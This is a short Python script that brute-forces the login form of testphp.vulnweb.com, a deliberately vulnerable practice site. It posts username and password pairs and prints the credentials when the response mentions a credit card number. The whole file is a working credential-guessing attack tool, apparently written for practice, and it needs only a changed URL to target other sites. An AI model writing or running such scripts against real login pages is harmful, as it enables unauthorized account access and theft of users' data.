#functions to make 
#1) one who is making each data / payload to add/data 
#2) who is try brute-force & checking for the error & successful attempt
import requests
#1)
def dictMaker(usernames,passwords,url):
    for idx,eachUsername in enumerate(usernames):
        details = {}
        details["uname"] = eachUsername
        details["pass"] = passwords[idx]
        print(details)
        if bfRequest(details,url):
            print("Stopping - Brute Force......")
            break
def bfRequest(details,url):
    print("Trying....")
    response = requests.post(url,data=details)
    data = response.content.decode("utf-8")
    if "credit card number" in data.lower():
        print("CORRECT CREDENTIALS")
        print("--> ",details["uname"] ,details["pass"]) 
        return True
    else:
        print("[-] Incorrect credentials.")
    return False
if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/userinfo.php"
    usernames = ["hanief", "furqan", "abcd", "nobody", "instagarm", "test"]
    passwords = ["abcd", "efghi", "idkwhatis", "2234", "tdkfjds", "test"]
    
    dictMaker(usernames, passwords,url) 